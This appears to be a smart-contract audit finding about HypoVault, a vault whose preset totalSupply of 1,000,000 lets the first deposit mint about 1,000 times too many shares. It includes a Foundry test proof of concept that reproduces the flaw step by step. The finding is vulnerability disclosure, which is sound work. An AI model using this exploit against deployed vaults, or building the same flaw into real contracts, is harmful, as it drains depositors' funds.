  "body": "## Summary\n`HypoVault` pre-sets `totalSupply = 1 000 000` in the constructor while the vault owns **zero** underlying assets.  When the first deposit is fulfilled, `totalAssets` evaluates to `1`, so shares minted equal\n\n```\nshares = assets * totalSupply / totalAssets\n       = assets * 1_000_000 / 1\n```\n\nA 1 000-asset deposit therefore mints **1 000 000 000 shares**.  The vault’s share-price collapses (~10⁻⁶ asset per share), permanently corrupting all accounting.\n\n## Root Cause\n1. **Bootstrap supply without assets**\n   ```solidity\n   constructor(...) {\n       ...\n       totalSupply = 1_000_000;   // no balances minted\n   }\n   ```\n2. **Near-zero denominator in fulfilment math**\n   ```solidity\n   totalAssets = computeNAV() + 1\n               - epochState.assetsDeposited\n               - reservedWithdrawalAssets;\n   ```\n   Before the first fulfilment `computeNAV() == assetsDeposited`, so `totalAssets == 1`.\n3. Both `fulfillDeposits` and `fulfillWithdrawals` use `Math.mulDiv()` with this 1-wei denominator, inflating/devaluing shares and assets.\n\n## Exploit / Impact\n* First depositor instantly controls ~100 % of shares for negligible cost.\n* Later depositors buy worthless shares; their funds are effectively stolen.\n* Withdrawals can burn huge numbers of shares for tiny (or zero) assets.\n* Performance-fee logic, NAV reporting and integrations relying on share price are wrong.\n* Financial loss is unbounded; all subsequent deposits can be drained.\n\n\n## Recommended Mitigations\n1. **Start with zero supply** – remove the hard-coded `totalSupply` and mint shares only when assets exist.  For the very first deposit, mint `sharesReceived = assetsToFulfill`.",
  "proof_of_concept": "```\n\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console2.sol\";\nimport \"../src/HypoVault.sol\";\nimport {ERC20S} from \"lib/panoptic-v1.1/test/foundry/testUtils/ERC20S.sol\";\nimport {Math} from \"lib/panoptic-v1.1/contracts/libraries/Math.sol\";\n\ncontract VaultAccountantMock {\n    mapping(address => uint256) public navHistory;\n    address public vault;\n\n    function setVault(address _vault) external {\n        vault = _vault;\n    }\n\n    function computeNAV(\n        address _vault,\n        address,\n        bytes memory\n    ) external view returns (uint256) {\n        require(_vault == vault, \"Invalid vault\");\n        // Return the balance of the vault (simulating NAV = vault balance)\n        return ERC20S(HypoVault(_vault).underlyingToken()).balanceOf(_vault);\n    }\n}\n\ncontract VulnerabilityTest is Test {\n    VaultAccountantMock public accountant;\n    HypoVault public vault;\n    ERC20S public token;\n\n    address Manager = address(0x1234);\n    address FeeWallet = address(0x5678);\n    address User = address(0xABCD);\n\n    function setUp() public {\n        accountant = new VaultAccountantMock();\n        token = new ERC20S(\"Test Token\", \"TEST\", 18);\n        vault = new HypoVault(address(token), Manager, IVaultAccountant(address(accountant)), 0); // 0% fee for simplicity\n        accountant.setVault(address(vault));\n\n        // Set fee wallet\n        vault.setFeeWallet(FeeWallet);\n\n        // Mint tokens for user\n        token.mint(User, 10000 ether);\n        vm.prank(User);\n        token.approve(address(vault), type(uint256).max);\n    }\n\n    function test_ExactScenarioFromReport() public {\n        console2.log(\"=== EXACT SCENARIO FROM VULNERABILITY REPORT ===\\n\");\n        \n        // Step 1: HypoVault is deployed with totalSupply = 1,000,000\n        assertEq(vault.totalSupply(), 1_000_000);\n        console2.log(\"1. HypoVault deployed with totalSupply =\", vault.totalSupply());\n        \n        // Step 2: User deposits 1000 assets via requestDeposit\n        uint256 depositAmount = 1000;\n        console2.log(\"\\n2. User deposits\", depositAmount, \"assets via requestDeposit\");\n        \n        vm.prank(User);\n        vault.requestDeposit(uint128(depositAmount));\n        \n        // Step 3: Manager calls fulfillDeposits\n        console2.log(\"\\n3. Manager calls fulfillDeposits\");\n        console2.log(\"   Inside fulfillDeposits:\");\n        \n        vm.prank(Manager);\n        \n        // Show the calculation step by step\n        uint256 computedNAV = depositAmount; // NAV equals the deposited balance\n        uint256 assetsDeposited = depositAmount;\n        uint256 reservedWithdrawals = 0;\n        \n        console2.log(\"   - computeNAV() returns:\", computedNAV);\n        console2.log(\"   - assetsDeposited:\", assetsDeposited);\n        console2.log(\"   - totalAssets = computeNAV() + 1 - assetsDeposited\");\n        \n        uint256 totalAssets = computedNAV + 1 - assetsDeposited;\n        console2.log(\"   - totalAssets = NAV + 1 - assetsDeposited =\", totalAssets);\n        \n        // Step 4: New shares calculation\n        console2.log(\"\\n4. New shares calculation:\");\n        uint256 newShares = Math.mulDiv(depositAmount, 1_000_000, totalAssets);\n        console2.log(\"   - shares = assets * totalSupply / totalAssets\");\n        console2.log(\"   - shares = 1000 * 1000000 / 1\");\n        console2.log(\"   - shares =\", newShares);\n        \n        // Actually fulfill the deposit\n        vault.fulfillDeposits(depositAmount, \"\");\n        \n        // Get the actual shares minted\n        (,uint128 actualSharesMinted,) = vault.depositEpochState(0);\n        \n        console2.log(\"\\n5. Result: User minted\", uint256(actualSharesMinted), \"shares!\");\n        console2.log(\"   (That's\", uint256(actualSharesMinted) / depositAmount, \"shares per asset deposited)\");\n        \n        // Verify the exact vulnerability\n        assertEq(totalAssets, 1, \"totalAssets should equal 1\");\n        assertEq(uint256(actualSharesMinted), 1_000_000_000, \"User should receive 1 billion shares for 1000 assets\");\n        assertEq(uint256(actualSharesMinted), depositAmount * 1_000_000, \"Shares = deposit * initial totalSupply\");\n        \n        console2.log(\"\\n=== VULNERABILITY CONFIRMED ===\");\n        console2.log(\"The first depositor receives shares at a rate of initialTotalSupply:1\");\n        console2.log(\"This permanently breaks the vault's share accounting!\");\n        \n        // Show impact on subsequent operations\n        console2.log(\"\\n6. Impact on fulfillWithdrawals:\");\n        console2.log(\"   - totalSupply is now in the billions:\", vault.totalSupply());\n        console2.log(\"   - totalAssets is in the thousands:\", computedNAV);\n        console2.log(\"   - Share price is permanently distorted\");\n    }\n}\n```",
